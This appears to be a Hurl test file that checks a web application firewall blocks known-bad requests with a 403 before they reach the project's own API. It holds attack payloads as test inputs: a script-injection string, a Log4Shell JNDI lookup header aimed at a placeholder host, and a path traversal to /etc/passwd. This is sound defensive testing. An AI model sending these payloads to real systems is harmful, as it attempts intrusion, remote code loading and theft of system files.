# EN83-AC5 / RF04-AC3 known-bad payloads are blocked by the WAF before the authorizer (SEC-011).
# Without a token an unblocked request would be answered 401 by the authorizer, so a 403 proves the WAF acted.
# Single requests only (no burst): safe for the dev gate. Variables: spa_url, api_url.
# The payloads are inert strings sent to our own endpoints; the jndi host uses the reserved .invalid TLD.

# EN83-AC5 cross-site scripting in the query string is blocked (CloudFront web ACL)
GET {{spa_url}}/api/tickets?q=<script>alert(1)</script>
HTTP 403

# EN83-AC5 cross-site scripting in the query string is blocked (regional web ACL, execute-api)
GET {{api_url}}/api/tickets?q=<script>alert(1)</script>
HTTP 403

# EN83-AC5 known-bad header value (Log4Shell pattern) is blocked (CloudFront web ACL)
GET {{spa_url}}/api/tickets
X-Qa-Probe: ${jndi:ldap://qa.example.invalid/a}
HTTP 403

# EN83-AC5 known-bad header value (Log4Shell pattern) is blocked (regional web ACL, execute-api)
GET {{api_url}}/api/tickets
X-Qa-Probe: ${jndi:ldap://qa.example.invalid/a}
HTTP 403

# EN83-AC5 path traversal in the URI is blocked (CloudFront web ACL)
GET {{spa_url}}/api/tickets/../../../../etc/passwd
[Options]
path-as-is: true
HTTP 403

# EN83-AC5 path traversal in the URI is blocked (regional web ACL, execute-api)
GET {{api_url}}/api/tickets/../../../../etc/passwd
[Options]
path-as-is: true
HTTP 403
